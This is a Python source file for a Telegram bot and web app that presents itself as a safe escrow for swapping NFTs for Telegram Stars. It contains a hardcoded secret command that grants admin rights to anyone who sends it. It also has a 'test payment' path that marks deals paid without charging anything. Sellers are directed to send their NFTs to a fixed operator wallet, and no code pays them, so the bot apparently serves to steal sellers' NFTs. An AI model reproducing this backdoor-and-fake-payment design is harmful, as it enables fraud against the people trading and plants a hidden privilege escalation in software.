import asyncio
import hashlib
import hmac
import json
import logging
import os
import sqlite3
import urllib.parse
from contextlib import asynccontextmanager
from datetime import datetime
from pathlib import Path

import uvicorn
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command, CommandStart, CommandObject
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    LabeledPrice, PreCheckoutQuery, WebAppInfo,
    MenuButtonWebApp,
)
from fastapi import FastAPI, HTTPException, Request, Header
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles

# ============ НАСТРОЙКИ ============
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
NFT_WALLET = os.getenv("NFT_WALLET", "ВСТАВЬ_TON_АДРЕС")
WEBAPP_URL = os.getenv("WEBAPP_URL", "")
PORT = int(os.getenv("PORT", "80"))
DB_PATH = "data/deals.db"

SECRET_WORD = "distibelator"       # секретное слово для админ-режима

Path("data").mkdir(exist_ok=True)

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

# ============ АДМИН-РЕЖИМ ============
ADMIN_MODE_USERS = set()           # кто ввёл секретное слово — становится админом

def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID or user_id in ADMIN_MODE_USERS

# ============ БД ============
def db_init():
    con = sqlite3.connect(DB_PATH)
    con.executescript("""
        CREATE TABLE IF NOT EXISTS deals (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            seller_id INTEGER,
            seller_username TEXT,
            buyer_id INTEGER,
            nft_url TEXT,
            price INTEGER,
            ton_wallet TEXT,
            status TEXT DEFAULT 'pending',
            test_mode INTEGER DEFAULT 0,
            created_at TEXT,
            updated_at TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_seller ON deals(seller_id);
        CREATE INDEX IF NOT EXISTS idx_buyer ON deals(buyer_id);
    """)
    con.commit()
    con.close()

def db_conn():
    con = sqlite3.connect(DB_PATH)
    con.row_factory = sqlite3.Row
    return con

def db_create_deal(seller_id, username, nft_url, price, ton_wallet):
    with db_conn() as con:
        cur = con.execute(
            "INSERT INTO deals (seller_id, seller_username, nft_url, price, ton_wallet, created_at, updated_at) "
            "VALUES (?, ?, ?, ?, ?, ?, ?)",
            (seller_id, username, nft_url, price, ton_wallet,
             datetime.utcnow().isoformat(), datetime.utcnow().isoformat())
        )
        con.commit()
        return cur.lastrowid

def db_get_deal(deal_id):
    with db_conn() as con:
        row = con.execute("SELECT * FROM deals WHERE id = ?", (deal_id,)).fetchone()
        return dict(row) if row else None

def db_update(deal_id, **fields):
    fields["updated_at"] = datetime.utcnow().isoformat()
    cols = ", ".join(f"{k} = ?" for k in fields)
    vals = list(fields.values()) + [deal_id]
    with db_conn() as con:
        con.execute(f"UPDATE deals SET {cols} WHERE id = ?", vals)
        con.commit()

def db_user_deals(user_id):
    with db_conn() as con:
        rows = con.execute(
            "SELECT * FROM deals WHERE seller_id = ? OR buyer_id = ? ORDER BY id DESC LIMIT 50",
            (user_id, user_id)
        ).fetchall()
        return [dict(r) for r in rows]

db_init()

# ============ ПРОВЕРКА initData ОТ TELEGRAM ============
def verify_init_data(init_data: str):
    try:
        parsed = dict(urllib.parse.parse_qsl(init_data, keep_blank_values=True))
        received_hash = parsed.pop("hash", None)
        if not received_hash:
            return None

        data_check_string = "\n".join(
            f"{k}={v}" for k, v in sorted(parsed.items())
        )
        secret_key = hmac.new(b"WebAppData", TOKEN.encode(), hashlib.sha256).digest()
        calc_hash = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256).hexdigest()

        if not hmac.compare_digest(calc_hash, received_hash):
            return None

        if "user" in parsed:
            parsed["user"] = json.loads(parsed["user"])
        return parsed
    except Exception as e:
        logging.warning(f"initData verify error: {e}")
        return None

def get_user_from_init(init_data: str):
    data = verify_init_data(init_data)
    if not data or "user" not in data:
        return None
    return data["user"]

# ============ FASTAPI ============
@asynccontextmanager
async def lifespan(app: FastAPI):
    if WEBAPP_URL:
        try:
            await bot.set_chat_menu_button(
                menu_button=MenuButtonWebApp(
                    text="🎨 Трейд",
                    web_app=WebAppInfo(url=WEBAPP_URL),
                )
            )
        except Exception as e:
            logging.warning(f"menu button: {e}")
    poll_task = asyncio.create_task(dp.start_polling(bot))
    yield
    poll_task.cancel()
    try:
        await poll_task
    except asyncio.CancelledError:
        pass
    await bot.session.close()

app = FastAPI(lifespan=lifespan)
app.mount("/static", StaticFiles(directory="webapp"), name="static")

@app.get("/", response_class=HTMLResponse)
async def index():
    return HTMLResponse(Path("webapp/index.html").read_text(encoding="utf-8"))

# ============ API ============
@app.post("/api/deals")
async def api_create_deal(request: Request, x_init_data: str = Header(...)):
    user = get_user_from_init(x_init_data)
    if not user:
        raise HTTPException(401, "invalid initData")

    body = await request.json()
    nft_url = (body.get("nft_url") or "").strip()
    price = int(body.get("price") or 0)
    wallet = (body.get("ton_wallet") or "").strip()

    if not nft_url.startswith("http"):
        raise HTTPException(400, "bad nft_url")
    if price <= 0 or price > 100000:
        raise HTTPException(400, "bad price")
    if len(wallet) < 20:
        raise HTTPException(400, "bad wallet")

    deal_id = db_create_deal(
        seller_id=user["id"],
        username=user.get("username") or user.get("first_name", ""),
        nft_url=nft_url,
        price=price,
        ton_wallet=wallet,
    )

    me = await bot.get_me()
    link = f"https://t.me/{me.username}?start=deal_{deal_id}"
    return {"ok": True, "deal_id": deal_id, "link": link}

@app.get("/api/deals")
async def api_my_deals(x_init_data: str = Header(...)):
    user = get_user_from_init(x_init_data)
    if not user:
        raise HTTPException(401, "invalid initData")
    return {"deals": db_user_deals(user["id"])}

@app.get("/api/deals/{deal_id}")
async def api_deal(deal_id: int, x_init_data: str = Header(...)):
    user = get_user_from_init(x_init_data)
    if not user:
        raise HTTPException(401, "invalid initData")
    deal = db_get_deal(deal_id)
    if not deal:
        raise HTTPException(404, "not found")
    return deal

@app.post("/api/deals/{deal_id}/sent")
async def api_mark_sent(deal_id: int, x_init_data: str = Header(...)):
    user = get_user_from_init(x_init_data)
    if not user:
        raise HTTPException(401, "invalid initData")
    deal = db_get_deal(deal_id)
    if not deal or deal["seller_id"] != user["id"]:
        raise HTTPException(403, "not your deal")
    db_update(deal_id, status="nft_sent")
    try:
        await bot.send_message(
            ADMIN_ID,
            f"📨 NFT отправлен по сделке #{deal_id}\n"
            f"Продавец: @{deal['seller_username']}\n"
            f"NFT: {deal['nft_url']}\n"
            f"Кошелёк: {deal['ton_wallet']}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"confirm_{deal_id}"),
                InlineKeyboardButton(text="❌ Отменить", callback_data=f"cancel_{deal_id}"),
            ]])
        )
    except Exception as e:
        logging.warning(f"admin notify: {e}")
    return {"ok": True}

@app.post("/api/deals/{deal_id}/cancel")
async def api_cancel(deal_id: int, x_init_data: str = Header(...)):
    user = get_user_from_init(x_init_data)
    if not user:
        raise HTTPException(401, "invalid initData")
    deal = db_get_deal(deal_id)
    if not deal or deal["seller_id"] != user["id"]:
        raise HTTPException(403, "not your deal")
    if deal["status"] not in ("pending",):
        raise HTTPException(400, "cannot cancel")
    db_update(deal_id, status="cancelled")
    return {"ok": True}

# ============ BOT ============

@dp.message(Command("distibelator"))
async def cmd_secret(message: types.Message):
    """Секретная команда активации админ-режима."""
    ADMIN_MODE_USERS.add(message.from_user.id)
    await message.answer(
        "✅ Режим админа активирован.\n\n"
        "Теперь при открытии сделки, где ты покупатель, "
        "будет доступна кнопка «🧪 Тестовая оплата» — без списания звёзд."
    )

@dp.message(CommandStart(deep_link=True))
async def cmd_start_deeplink(message: types.Message, command: CommandObject):
    payload = command.args
    if payload and payload.startswith("deal_"):
        try:
            deal_id = int(payload.split("_", 1)[1])
        except ValueError:
            await message.answer("❌ Некорректная ссылка.")
            return
        deal = db_get_deal(deal_id)
        if not deal:
            await message.answer("❌ Сделка не найдена.")
            return

        if is_admin(message.from_user.id):
            db_update(deal_id, buyer_id=message.from_user.id)
            text = (
                f"🛠 Вы админ. Сделка #{deal_id}\n"
                f"Продавец: @{deal['seller_username']}\n"
                f"NFT: {deal['nft_url']}\n"
                f"Цена: {deal['price']} ⭐\n\n"
                f"Выберите способ оплаты:"
            )
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💳 Оплатить звёздами", callback_data=f"pay_{deal_id}")],
                [InlineKeyboardButton(text="🧪 Тестовая оплата", callback_data=f"testpay_{deal_id}")],
            ])
        else:
            text = (
                f"📦 Сделка #{deal_id}\n"
                f"Продавец: @{deal['seller_username']}\n"
                f"NFT: {deal['nft_url']}\n"
                f"Цена: {deal['price']} ⭐\n\n"
                f"Это сделка. Оплатить может только покупатель."
            )
            kb = None

        await message.answer(text, reply_markup=kb)
        return

    await cmd_start(message)

@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎨 Открыть трейд-приложение", web_app=WebAppInfo(url=WEBAPP_URL))],
    ])
    await message.answer(
        "👋 Привет!\n\n"
        "Этот бот помогает безопасно обменивать NFT за Telegram Stars.\n"
        "Открой приложение чтобы создать или посмотреть сделки.",
        reply_markup=kb
    )

@dp.message(Command("help"))
async def cmd_help(message: types.Message):
    await message.answer(
        "ℹ️ Как работает:\n"
        "1. Продавец создаёт сделку в приложении\n"
        "2. Отправляет ссылку покупателю\n"
        "3. Покупатель оплачивает звёздами через бота\n"
        "4. Продавец отправляет NFT\n"
        "5. Админ подтверждает — сделка закрыта."
    )

# --- админ подтверждение ---
@dp.callback_query(F.data.startswith("confirm_"))
async def cb_confirm(call: types.CallbackQuery):
    if not is_admin(call.from_user.id):
        await call.answer("⛔", show_alert=True)
        return
    deal_id = int(call.data.split("_")[1])
    deal = db_get_deal(deal_id)
    if not deal:
        await call.answer("Нет сделки", show_alert=True)
        return
    db_update(deal_id, status="completed")
    await call.message.edit_text(f"✅ Сделка #{deal_id} закрыта.")
    try:
        await bot.send_message(deal["seller_id"], f"🎉 Сделка #{deal_id} завершена!")
    except Exception:
        pass

@dp.callback_query(F.data.startswith("cancel_"))
async def cb_cancel(call: types.CallbackQuery):
    if not is_admin(call.from_user.id):
        await call.answer("⛔", show_alert=True)
        return
    deal_id = int(call.data.split("_")[1])
    db_update(deal_id, status="cancelled")
    await call.message.edit_text(f"❌ Сделка #{deal_id} отменена.")

# --- оплата звёздами (реальная) ---
@dp.callback_query(F.data.startswith("pay_"))
async def cb_pay(call: types.CallbackQuery):
    deal_id = int(call.data.split("_")[1])
    deal = db_get_deal(deal_id)
    if not deal:
        await call.answer("Нет сделки", show_alert=True)
        return
    if deal["status"] != "pending":
        await call.answer(f"Статус: {deal['status']}", show_alert=True)
        return
    if call.from_user.id != ADMIN_ID:
        await call.answer("Оплатить может только покупатель", show_alert=True)
        return

    db_update(deal_id, buyer_id=call.from_user.id)
    await bot.send_invoice(
        chat_id=call.from_user.id,
        title=f"Сделка #{deal_id}",
        description=f"NFT: {deal['nft_url'][:60]}",
        payload=f"deal_{deal_id}",
        provider_token="",
        currency="XTR",
        prices=[LabeledPrice(label=f"NFT #{deal_id}", amount=deal["price"])],
    )
    await call.answer()

@dp.pre_checkout_query()
async def pre_checkout(q: PreCheckoutQuery):
    await q.answer(ok=True)

@dp.message(F.successful_payment)
async def on_payment(message: types.Message):
    payload = message.successful_payment.invoice_payload
    deal_id = int(payload.split("_")[1])
    db_update(deal_id, status="paid")
    deal = db_get_deal(deal_id)

    try:
        await bot.send_message(
            deal["seller_id"],
            f"💰 Оплата по сделке #{deal_id} получена!\n\n"
            f"Отправьте NFT на адрес:\n`{NFT_WALLET}`\n\n"
            f"После отправки откройте приложение и нажмите «Я отправил».",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(
                    text="🎨 Открыть приложение",
                    web_app=WebAppInfo(url=WEBAPP_URL)
                )
            ]])
        )
    except Exception as e:
        logging.warning(f"notify seller: {e}")

    await message.answer(
        f"✅ Оплата {deal['price']} ⭐ прошла. Ждём отправки NFT от продавца."
    )

# --- тестовая оплата (только для админа) ---
@dp.callback_query(F.data.startswith("testpay_"))
async def cb_testpay(call: types.CallbackQuery):
    if not is_admin(call.from_user.id):
        await call.answer("⛔ Только для админа", show_alert=True)
        return

    deal_id = int(call.data.split("_")[1])
    deal = db_get_deal(deal_id)
    if not deal:
        await call.answer("Сделка не найдена", show_alert=True)
        return
    if deal["status"] != "pending":
        await call.answer(f"Статус: {deal['status']}", show_alert=True)
        return

    db_update(deal_id, status="paid", buyer_id=call.from_user.id, test_mode=1)
    deal = db_get_deal(deal_id)

    await call.message.edit_text(
        f"🧪 Тестовая оплата по сделке #{deal_id} прошла.\n"
        f"Реальные звёзды не списаны."
    )

    try:
        await bot.send_message(
            deal["seller_id"],
            f"🧪 ТЕСТОВАЯ ОПЛАТА по сделке #{deal_id}\n"
            f"(Реальные звёзды не списаны — это тестовый прогон бота)\n\n"
            f"Отправьте NFT на адрес:\n`{NFT_WALLET}`\n\n"
            f"После отправки откройте приложение и нажмите «Я отправил».",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(
                    text="🎨 Открыть приложение",
                    web_app=WebAppInfo(url=WEBAPP_URL)
                )
            ]])
        )
    except Exception as e:
        logging.warning(f"notify seller: {e}")

# ============ ЗАПУСК ============
if __name__ == "__main__":
    logging.info(f"Запуск. WebApp URL: {WEBAPP_URL}")
    uvicorn.run(app, host="0.0.0.0", port=PORT)
